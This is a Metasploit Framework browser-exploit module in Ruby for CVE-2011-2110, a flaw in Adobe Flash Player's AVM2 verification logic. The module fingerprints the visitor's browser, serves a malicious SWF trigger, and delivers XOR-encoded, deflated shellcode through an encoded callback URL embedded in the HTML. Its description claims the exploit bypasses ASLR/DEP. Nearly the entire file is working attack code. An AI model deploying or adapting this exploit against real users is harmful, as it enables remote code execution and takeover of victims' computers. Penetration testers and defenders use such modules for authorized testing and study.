##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe Flash Player AVM Verification Logic Array Indexing Code Execution',
			'Description'    => %q{
					This module exploits a vulnerability in Adobe Flash Player versions 10.3.181.23
				and earlier. This issue is caused by a failure in the ActionScript3 AVM2 verification
				logic. This results in unsafe JIT(Just-In-Time) code being executed. This is the same
				vulnerability that was used for attacks against Korean based organizations.

					Specifically, this issue occurs when indexing an array using an arbitrary value,
				memory can be referenced and later executed. Taking advantage of this issue does not rely
				on heap spraying as the vulnerability can also be used for information leakage.

					Currently this exploit works for IE6, IE7, IE8, Firefox 10.2 and likely several
				other browsers under multiple Windows platforms. This exploit bypasses ASLR/DEP and
				is very reliable.
				},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'mr_me <steventhomasseeley[at]gmail.com>', # msf exploit,
					'Unknown'                                  # malware version seen used in targeted attacks
				],
			'Version'        => '$Revision$',
			'References'     =>
				[
					['CVE', '2011-2110'],
					['OSVDB', '48268'],
					['URL', 'http://www.adobe.com/devnet/swf.html'],
					['URL', 'http://www.adobe.com/support/security/bulletins/apsb11-18.html'],
					['URL', 'http://www.accessroot.com/arteam/site/download.php?view.331'],
					['URL', 'http://www.shadowserver.org/wiki/pmwiki.php/Calendar/20110617'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC'             => 'process',
					'HTTP::compression'    => 'gzip',
					'HTTP::chunked'        => true,
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Payload'        =>
				{
					'Space'       => 2000,
					'BadChars'    => "\x00",
					'DisableNops' => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', {}],
				],
			'DisclosureDate' => 'Jun 21 2012',
			'DefaultTarget'  => 0))
	end

	def exploit
		# src for the flash file: external/source/exploits/CVE-2011-2110/CVE-2011-2110.as
		# full aslr/dep bypass using the info leak as per malware
		path = File.join( Msf::Config.install_root, "data", "exploits", "CVE-2011-2110.swf" )
		fd = File.open( path, "rb" )
		@swf = fd.read(fd.stat.size)
		fd.close
		super
	end

	def check_dependencies
		use_zlib
	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		if agent =~ /MSIE/
			return targets[0]  # ie 6/7/8 tested working
		elsif agent =~ /Firefox/
			return targets[0]  # ff 10.2 tested working
		else
			return nil
		end
	end

	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']
		my_target = get_target(agent)

		# Avoid the attack if the victim doesn't have the same setup we're targeting
		if my_target.nil?
			print_error("#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}")
			send_not_found(cli)
			return
		end

		xor_byte  = 122
		trigger   = @swf
		trigger_file = rand_text_alpha(rand(6)+3) + ".swf"
		code = rand_text_alpha(rand(6)+3) + ".txt"

		sc = Zlib::Deflate.deflate(payload.encoded)
		shellcode = ""

		sc.each_byte do | c |
			shellcode << (xor_byte ^ c)
		end

		uri  = ((datastore['SSL']) ? "https://" : "http://")
		uri << ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST'])
		uri << ":#{datastore['SRVPORT']}#{get_resource()}/#{code}"

		bd_uri = Zlib::Deflate.deflate(uri)

		uri = ""
		bd_uri.each_byte do | c |
			uri << (xor_byte ^ c)
		end

		bd_uri = uri.unpack("H*")[0]

		obj_id = rand_text_alpha(rand(6)+3)

		if request.uri.match(/\.swf/i)
			print_status("Sending malicious swf")
			send_response(cli, trigger, { 'Content-Type' => 'application/x-shockwave-flash' })
			return
		end

		if request.uri.match(/\.txt/i)
			print_status("Sending payload")
			send_response(cli, shellcode, { 'Content-Type' => 'text/plain' })
			return
		end

		html =  <<-EOS
		<html>
		<head>
		</head>
		<body>
		<center>
		<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
		id="#{obj_id}" width="600" height="400"
		codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab">
		<param name="movie" value="#{get_resource}/#{trigger_file}?info=#{bd_uri}" />
		<embed src="#{get_resource}/#{trigger_file}?info=#{bd_uri}" quality="high"
		width="320" height="300" name="#{obj_id}" align="middle"
		allowNetworking="all"
		type="application/x-shockwave-flash"
		pluginspage="http://www.macromedia.com/go/getflashplayer">
		</embed>
		</object>
		</center>
		</body>
		</html>
		EOS

		html = html.gsub(/^\t\t/, '')

		print_status("Sending #{self.name} HTML")
		send_response(cli, html, { 'Content-Type' => 'text/html' })
	end
end
